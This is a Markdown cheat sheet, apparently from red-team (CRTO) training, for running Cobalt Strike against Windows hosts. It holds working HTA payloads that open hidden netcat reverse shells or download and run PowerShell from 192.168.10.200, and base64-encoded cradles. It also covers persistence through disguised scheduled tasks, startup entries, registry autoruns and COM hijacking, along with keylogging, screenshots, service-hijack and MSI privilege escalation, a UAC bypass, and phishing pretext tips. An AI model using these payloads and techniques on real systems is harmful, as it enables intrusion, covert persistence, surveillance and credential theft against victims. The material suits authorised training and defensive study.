### Starting CS
#### How to start cobalt strike 4.3 ?
1. First start team server `./teamserver <KALI IP> <some password> <some C2 malleable profile>`
2. First start team server `./teamserver 192.168.10.200 password123 havex.profile`
3. Then `./start.sh`

#### Useful commands for CS 4.3?
1. Change beacon time `sleep <digit number>`
2. E.g Change beacon time to 02 seconds `sleep 2`
3. Run commands via cmd.exe `shell <some command>`
4. E.g `shell dir` or `shell whoami`

### HTA files
#### .hta file execution (requres Internet Explorer) 01 - Simple Hello World
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>
</html>
```
#### .hta file execution (requres Internet Explorer) 02 - Get reverse shell "console" is hidden
```
<html>
  <head>
    <title>Reverse Shell</title>
  </head>
  <body>
    <h2>get reverse shell on 192.168.10.200 at port 00</h2>
    <p>This is a HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      Shell.Run "cmd /c C:\Users\jon\Desktop\crtoStuff\nc.exe -e cmd.exe 192.168.10.200 200", 0, True
    End Function

    Pwn
  </script>
</html>
```
#### .hta file execution (requres Internet Explorer) 03 - Get poweshell reverse shell
1. In CS navigate to **Attacks > Web Drive-by > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for HTTP listener**. The URI path can be anything for e.g I had it **/tempOld**. 
2. By default if we use **powershell.exe** instead of giving the full path its not going to laucnh. This is because we have a **64bit** powershell payload but **.hta** uses **32 bit mstha.exe**. However, we can fix it by specifiying the fullpath with **sysnative**
```
<html>
  <head>
    <title>PS Shell</title>
  </head>
  <body>
    <h2>get shell PS</h2>
    <p>This is a HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.exec "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
      ' This will fail -> shell.exec "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
    End Function

    Pwn
  </script>
</html>
```
#### .hta file execution (requres Internet Explorer) 04 - Get poweshell reverse shell after checking the desired architecture
```
<html>
  <head>
    <title>PS Shell</title>
  </head>
  <body>
    <h2>get shell PS</h2>
    <p>This is a HTA...</p>
  </body>
  
  <script language="VBScript">
    Function Pwn()
  Set shell = CreateObject("wscript.Shell")
  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
  Else
    shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
  End If
    End Function
    Pwn
  </script>
</html>

```

### .macro for MS Word
1. Generate a macro for MS WORD **Attacks -> Packages -> MS Office Macro**
2. Copy & Paste the macro in the MS Word document (remeber to use **.doc** not the **.docx**
3. Disable Defender and Run it, you'll get the beacon 

### Persistence
#### Persistence for MS Windows via SharPersist - Mehtod schtask
1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
2. The above will generate a **PS payload, hosted on the CS TeamServer and will be run in memory**
3. E.g. it will be something like
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/64bit'))"
```
3. To avoid issues, Base64 it as following:
```
Linux : echo -en 'IEX ((new-object net.webclient).downloadstring("http://192.168.10.200:80/64bit"))' | iconv -t UTF-16LE | base64 -w 0
PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX ((new-object net.webclient).downloadstring("http://192.168.10.200:80/64bit"))'))
```
4. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "AV-Definition-Update" -m add -o hourly`
5. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "SysMonLog" -m add -o logon`

#### Persistence for MS Windows via SharPersist - Mehtod startup folder
1. `execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -f "UserEnvSetup" -m add`
2. If above command goes well, it create a file **UserEnvSetup** inside the path **C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**

#### Persistence for MS Windows via SharPersist - Mehtod registry autorun
1. Generate a revershell exe from CS e.g **artifactx64.exe**. 
2. Place this **artifactx64.exe** in that **C:\tools\malPayloads\artifactx64.exe** in Windows 10 OS. 
3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`

#### Persistence for MS Windows via SharPersist - COM Hijacking DLL
1. Open **procmon64.exe** from **sysinternals suite**. 
2. Apply filters **Operations ---> RegKeyOpen** and **Result ---> NAME NOT FOUND** and **PATH (ends with) ---> InprocServer32**. 
3. Next open some program, e.g. **MS Word or maybe Edge** etc. 
4. Get some random **CLSID**. 
5. Use **Powershell** that the entry does exist in **HKLM**, but not in **HKCU**.
6. Will show ---> `Get-Item -Path "HKLM:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32"`
7. But will fail --> `Get-Item -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32"`
8. Create this CLSID `New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}"`
9. Specify that malicious dll `New-Item -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}" -Name "InprocServer32" -Value "C:\tools\malPayloads\comhijacking.dll"`
10. Next command `New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InprocServer32" -Name "ThreadingModel" -Value "Both"`
11. now when **MS Edge (internet explorer)** is loaded, you should get a **beacon**. 

### Host reconnaissance 
#### via seatbelt.exe
1. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system`
2. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user`
3. `execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe InternetSettings`

#### via screenshots
1. Take a single screenshot via PrintScr method ---> `printscreen`
2. Take a single screenshot ---> `screenshot`
3. Take periodic screenshots of desktop ---> `screenwatch`
4. Go to **View** and click **Screenshots** to view the SS.

#### via keyloggers
1. `keylogger`
2. From **view** ---> **keystrokes**
3. `jobs`

### Windows Privilege Escalation
#### peer-to-peer listners
1. generate a peer-to-peer listner e.g. **smb or tcp**. 
2. next generate a payload **exe** for **smb or tcp**. 
3. execute **exe**. 
4. you'll get a open listening port e.g. **0.0.0.0:4444** if its **tcp 4444**. `netstat -anp tcp`
5. `connect localhost 4444`.
6. for smb type `ls \\.\pipe`.
7. next type `link locahost`.
8. **link** command is for **SMB** and **connect** is for **TCP**. 

#### what is windows service ? 
1. A Windows "service" is a special type of application that is usually started automatically when the computer boots. e.g. Defender, Skype, Firewall etc.
2. We can view the services by typing **services.msc** or in **CMD** typing `sc query` or in **PowerShell** its `Get-Service | fl`.

#### method -> unquoted services path
1. `beacon> run wmic service get name, pathname`.
2. `powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl`.
3. find the services that have unquoted services path vulnerablity.
4. generate a payload e.g. **service.exe** and place it in the folder. use the payload with **TCP / SMB beacons** 
5. `run sc stop Vuln-Service-1`
6. `run sc start Vuln-Service-1`
7. `connect localhost <what ever the port number you used when generating the payload`
8. `connect localhost 4444`
9. Theme: **if there aren't proper quotes for white space applications, we can hijack it** 

#### method -> weak service permission
1. First check what permissions are assosicated with the service
2. Command A: `powershell-import C:\Tools\Get-ServiceAcl.ps1`
3. Command B: `powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty `
4. Lets assume we get **ServiceRights     : ChangeConfig, Start, Stop** response
5. So, we can try changing its **exe** path from **C:\Program Files\Vuln Services\Service 2.exe** to our malicious location e.g. **C:\temp\hack.exe**
6. Create and upload **TCP beacon exe** to the remote system -> `upload C:\Payloads\beacon-tcp-svc.exe`
7. Next -> `mv C:\Payloads\beacon-tcp-svc.exe C:\temp\fake-service.exe`
8. Check the orignal permissions of vulnservice2 -> `run sc qc Vuln-Service-2`
9. Next -> `run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe`
10. Next -> `run sc qc Vuln-Service-2`
11. Next -> `run sc query Vuln-Service-2`
12. Next -> `run sc stop Vuln-Service-2`
13. Next -> `run sc start Vuln-Service-2`
14. Next -> `connect localhost 4444`
15. Theme: **if there are weak permissions against an application, we can modify its .exe path and get our malicious .exe in C:\temp get executed**
#### method -> weak service binary permission
1. This is just like the above vulnerablity, just small modifications i.e. we have **modify** permission. This allows us to simply overwrite the binary with something else (make sure you take a backup first).
2. So make a new malicious **tcp-beacon.exe**. 
3. Stop the vuln service `run sc stop Vuln-Service-3`
4. Upload -> `upload tcp-beacon.exe`
5. Rename it to -> `mv tcp-beacon.exe vuln-service-3.exe`
6. Start -> `run sc start Vuln-Service-3`
7. Connect -> `connect localhost 4444`

#### method -> always install elevated
0. metasploit method of exploiting this is fairly easy.
1. Generate a TCP-BEACON.exe
2. Open Visual Studio -> Create New Project -> Setup Wizard -> Create a Setup for Windows Application -> Add beacon file .exe (under any additional files you want to include) -> Select the project -> Change Target Platform to x64
3. Click on the project -> View -> Custom Actions -> Install -> Add custom action -> select beaon.exe
4. Run 64bit = True
5. Save it and Build it, a **.msi** will be generated
6. `beacon> run msiexec /i BeaconInstaller.msi /q /n` 
7. `connect localhost 4444`
8. Migrate to some other process
9. `beacon> run msiexec /q /n uninstall BeaconInstaller.msi`
10. `connect localhost 4444`
#### method -> UAC Bypass
1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``

### Miscellaneous good points
1. While doing active reconnisane, use VPN to hide the real Public IP address. 
2. The **pretext** is the **"story"** behind why we want our target to open our email and carry out the desired actions.
3. Emotional characteristics that usually result in higher user engagment are **fear, urgency, greed and curiosity**.
